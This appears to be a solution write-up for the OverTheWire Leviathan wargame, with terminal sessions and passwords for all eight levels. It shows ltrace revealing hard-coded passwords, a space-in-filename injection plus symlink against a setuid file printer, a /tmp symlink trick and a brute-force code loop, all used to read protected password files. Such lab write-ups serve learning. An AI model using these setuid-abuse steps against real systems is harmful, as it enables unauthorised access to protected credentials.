@@ -1,0 +1,375 @@
+Host: leviathan.labs.overthewire.org
+Port: 2223
+
+Leviathan
+Dare you face the lord of the oceans?
+
+Leviathan is a wargame that has been rescued from the demise of intruded.net, previously hosted on leviathan.intruded.net. Big thanks to adc, morla and reth for their help in resurrecting this game!
+
+What follows below is the original description of leviathan, copied from intruded.net:
+
+Summary:
+Difficulty:     1/10
+Levels:         8
+Platform:   Linux/x86
+
+Author:
+Anders Tonfeldt
+
+Special Thanks:
+We would like to thank AstroMonk for coming up with a replacement idea for the last level,
+deadfood for finding a leveljump and Coi for finding a non-planned vulnerability.
+
+Description:
+This wargame doesn't require any knowledge about programming - just a bit of common
+sense and some knowledge about basic *nix commands. We had no idea that it'd be this
+hard to make an interesting wargame that wouldn't require programming abilities from 
+the players. Hopefully we made an interesting challenge for the new ones.
+
+Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on leviathan.labs.overthewire.org through SSH on port 2223.
+
+To login to the first level use:
+
+Username: leviathan0
+Password: leviathan0
+
+Data for the levels can be found in the homedirectories. You can look at /etc/leviathan_pass for the various level passwords.
+
+---
+
+Level 0
+
+ssh leviathan0@leviathan.labs.overthewire.org -p 2223
+password: leviathan0
+
+-
+
+
+  Enjoy your stay!
+
+leviathan0@gibson:~$ ls -la
+total 24
+drwxr-xr-x  3 root       root       4096 Sep 19 07:07 .
+drwxr-xr-x 83 root       root       4096 Sep 19 07:09 ..
+drwxr-x---  2 leviathan1 leviathan0 4096 Sep 19 07:07 .backup
+-rw-r--r--  1 root       root        220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root       root       3771 Mar 31  2024 .bashrc
+-rw-r--r--  1 root       root        807 Mar 31  2024 .profile
+
+leviathan0@gibson:~$ cd .backup
+leviathan0@gibson:~/.backup$ ls -a
+.  ..  bookmarks.html
+
+leviathan0@gibson:~/.backup$ grep leviathan1 bookmarks.html
+<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
+leviathan0@gibson:~/.backup$ 
+
+---
+
+Level 1
+
+ssh leviathan1@leviathan.labs.overthewire.org -p 2223
+password: 3QJ3TgzHDq
+
+- 
+
+leviathan1@gibson:~$ ls -la
+total 36
+drwxr-xr-x  2 root       root        4096 Sep 19 07:07 .
+drwxr-xr-x 83 root       root        4096 Sep 19 07:09 ..
+-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
+-r-sr-x---  1 leviathan2 leviathan1 15080 Sep 19 07:07 check
+-rw-r--r--  1 root       root         807 Mar 31  2024 .profile
+
+leviathan1@gibson:~$ ./check
+password: red
+Wrong password, Good Bye ...
+
+leviathan1@gibson:~$ ltrace ./check
+__libc_start_main(0x80490ed, 1, 0xffffd494, 0 <unfinished ...>
+printf("password: ")                             = 10
+getchar(0, 0, 0x786573, 0x646f67password: red
+
+)                = 114
+getchar(0, 114, 0x786573, 0x646f67)              = 101
+getchar(0, 0x6572, 0x786573, 0x646f67)           = 100
+strcmp("red", "sex")                             = -1
+puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
+)             = 29
++++ exited (status 0) +++
+
+leviathan1@gibson:~$ ./check
+password: sex
+$ whoami
+leviathan2
+$ cat /etc/leviathan_pass/leviathan2
+NsN1HwFoyN
+$ 
+
+---
+
+Level 2
+
+ssh leviathan2@leviathan.labs.overthewire.org -p 2223
+password: NsN1HwFoyN
+
+-
+
+  Enjoy your stay!
+
+leviathan2@gibson:~$ ls -la
+total 36
+drwxr-xr-x  2 root       root        4096 Sep 19 07:07 .
+drwxr-xr-x 83 root       root        4096 Sep 19 07:09 ..
+-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
+-r-sr-x---  1 leviathan3 leviathan2 15068 Sep 19 07:07 printfile
+-rw-r--r--  1 root       root         807 Mar 31  2024 .profile
+
+leviathan2@gibson:~$ ./printfile
+*** File Printer ***
+Usage: ./printfile filename
+
+leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+
+leviathan2@gibson:~$ mkdir /tmp/jin && touch /tmp/jin/test.txt
+
+leviathan2@gibson:~$ cd /tmp/jin
+leviathan2@gibson:/tmp/jin$ ltrace ~/printfile test.txt
+__libc_start_main(0x80490ed, 2, 0xffffd444, 0 <unfinished ...>
+access("test.txt", 4)                            = 0
+snprintf("/bin/cat test.txt", 511, "/bin/cat %s", "test.txt") = 17
+geteuid()                                        = 12002
+geteuid()                                        = 12002
+setreuid(12002, 12002)                           = 0
+system("/bin/cat test.txt" <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                           = 0
++++ exited (status 0) +++
+
+leviathan2@gibson:/tmp/jin$ touch pass\ file.txt
+leviathan2@gibson:/tmp/jin$ ltrace ~/printfile "pass file.txt"
+__libc_start_main(0x80490ed, 2, 0xffffd444, 0 <unfinished ...>
+access("pass file.txt", 4)                       = 0
+snprintf("/bin/cat pass file.txt", 511, "/bin/cat %s", "pass file.txt") = 22
+geteuid()                                        = 12002
+geteuid()                                        = 12002
+setreuid(12002, 12002)                           = 0
+system("/bin/cat pass file.txt"/bin/cat: pass: No such file or directory
+/bin/cat: file.txt: No such file or directory
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                           = 256
++++ exited (status 0) +++
+
+leviathan2@gibson:/tmp/jin$ ln -s /etc/leviathan_pass/leviathan3 /tmp/jin/pass
+leviathan2@gibson:/tmp/jin$ ls -la
+total 11380
+drwxrwxr-x    2 leviathan2 leviathan2     4096 Dec 28 21:02 .
+drwxrwx-wt 1590 root       root       11644928 Dec 28 21:03 ..
+lrwxrwxrwx    1 leviathan2 leviathan2       30 Dec 28 21:02 pass -> /etc/leviathan_pass/leviathan3
+-rw-rw-r--    1 leviathan2 leviathan2        0 Dec 28 21:01 pass file.txt
+-rw-rw-r--    1 leviathan2 leviathan2        0 Dec 28 20:59 test.txt
+
+leviathan2@gibson:/tmp/jin$ ~/printfile "pass file.txt"
+f0n8h2iWLP
+/bin/cat: file.txt: No such file or directory
+leviathan2@gibson:/tmp/jin$ 
+
+---
+
+Level 3
+
+ssh leviathan3@leviathan.labs.overthewire.org -p 2223
+password: f0n8h2iWLP
+
+-
+
+  Enjoy your stay!
+
+leviathan3@gibson:~$ ls -la
+total 40
+drwxr-xr-x  2 root       root        4096 Sep 19 07:07 .
+drwxr-xr-x 83 root       root        4096 Sep 19 07:09 ..
+-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
+-r-sr-x---  1 leviathan4 leviathan3 18096 Sep 19 07:07 level3
+-rw-r--r--  1 root       root         807 Mar 31  2024 .profile
+
+leviathan3@gibson:~$ ./level3
+Enter the password> red
+bzzzzzzzzap. WRONG
+
+leviathan3@gibson:~$ ltrace ./level3
+__libc_start_main(0x80490ed, 1, 0xffffd494, 0 <unfinished ...>
+strcmp("h0no33", "kakaka")                       = -1
+printf("Enter the password> ")                   = 20
+fgets(Enter the password> red
+
+"red\n", 256, 0xf7fae5c0)                  = 0xffffd26c
+strcmp("red\n", "snlprintf\n")                   = -1
+puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
+)                       = 19
++++ exited (status 0) +++
+
+leviathan3@gibson:~$ ./level3
+Enter the password> snlprintf
+[You've got shell]!
+$ whoami
+leviathan4
+$ cat /etc/leviathan_pass/leviathan4
+WG1egElCvO
+$ 
+
+---
+
+Level 4
+
+ssh leviathan4@leviathan.labs.overthewire.org -p 2223
+password: WG1egElCvO
+
+-
+
+  Enjoy your stay!
+
+leviathan4@gibson:~$ ls -la
+total 24
+drwxr-xr-x  3 root root       4096 Sep 19 07:07 .
+drwxr-xr-x 83 root root       4096 Sep 19 07:09 ..
+-rw-r--r--  1 root root        220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root root       3771 Mar 31  2024 .bashrc
+-rw-r--r--  1 root root        807 Mar 31  2024 .profile
+dr-xr-x---  2 root leviathan4 4096 Sep 19 07:07 .trash
+
+leviathan4@gibson:~$ cd .trash
+leviathan4@gibson:~/.trash$ ls -la
+total 24
+dr-xr-x--- 2 root       leviathan4  4096 Sep 19 07:07 .
+drwxr-xr-x 3 root       root        4096 Sep 19 07:07 ..
+-r-sr-x--- 1 leviathan5 leviathan4 14936 Sep 19 07:07 bin
+
+leviathan4@gibson:~/.trash$ ./bin
+00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010 
+leviathan4@gibson:~/.trash$
+
+https://www.rapidtables.com/convert/number/binary-to-ascii.html
+
+0dyxT7F4QD
+
+---
+
+Level 5
+
+ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+password: 0dyxT7F4QD
+
+-
+
+  Enjoy your stay!
+
+leviathan5@gibson:~$ ls -la
+total 36
+drwxr-xr-x  2 root       root        4096 Sep 19 07:07 .
+drwxr-xr-x 83 root       root        4096 Sep 19 07:09 ..
+-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
+-r-sr-x---  1 leviathan6 leviathan5 15140 Sep 19 07:07 leviathan5
+-rw-r--r--  1 root       root         807 Mar 31  2024 .profile
+
+leviathan5@gibson:~$ ./leviathan5
+Cannot find /tmp/file.log
+
+leviathan5@gibson:~$ ltrace ./leviathan5
+__libc_start_main(0x804910d, 1, 0xffffd484, 0 <unfinished ...>
+fopen("/tmp/file.log", "r")                      = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)                = 26
+exit(-1 <no return ...>
++++ exited (status 255) +++
+
+leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@gibson:~$ ./leviathan5
+szo7HDB88w
+leviathan5@gibson:~$ 
+
+---
+
+Level 6
+
+ssh leviathan6@leviathan.labs.overthewire.org -p 2223
+password: szo7HDB88w
+
+-
+
+  Enjoy your stay!
+
+leviathan6@gibson:~$ ls -la
+total 36
+drwxr-xr-x  2 root       root        4096 Sep 19 07:07 .
+drwxr-xr-x 83 root       root        4096 Sep 19 07:09 ..
+-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
+-r-sr-x---  1 leviathan7 leviathan6 15032 Sep 19 07:07 leviathan6
+-rw-r--r--  1 root       root         807 Mar 31  2024 .profile
+
+leviathan6@gibson:~$ ./leviathan6
+usage: ./leviathan6 <4 digit code>
+
+leviathan6@gibson:~$ for i in {0000..9999}; do ./leviathan6 $i; done
+Wrong
+Wrong
+-SNIP-
+Wrong
+Wrong
+$ whoami
+leviathan7
+$ cat /etc/leviathan_pass/leviathan7
+qEs5Io5yM8
+$ 
+
+---
+
+Level 7
+
+ssh leviathan7@leviathan.labs.overthewire.org -p 2223
+password: qEs5Io5yM8
+
+-
+
+leviathan7@gibson:~$ ls -la
+total 24
+drwxr-xr-x  2 root       root       4096 Sep 19 07:07 .
+drwxr-xr-x 83 root       root       4096 Sep 19 07:09 ..
+-rw-r--r--  1 root       root        220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root       root       3771 Mar 31  2024 .bashrc
+-r--r-----  1 leviathan7 leviathan7  178 Sep 19 07:07 CONGRATULATIONS
+-rw-r--r--  1 root       root        807 Mar 31  2024 .profile
+
+leviathan7@gibson:~$ cat CONGRATULATIONS
+Well Done, you seem to have used a *nix system before, now try something more serious.
+(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
+leviathan7@gibson:~$ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
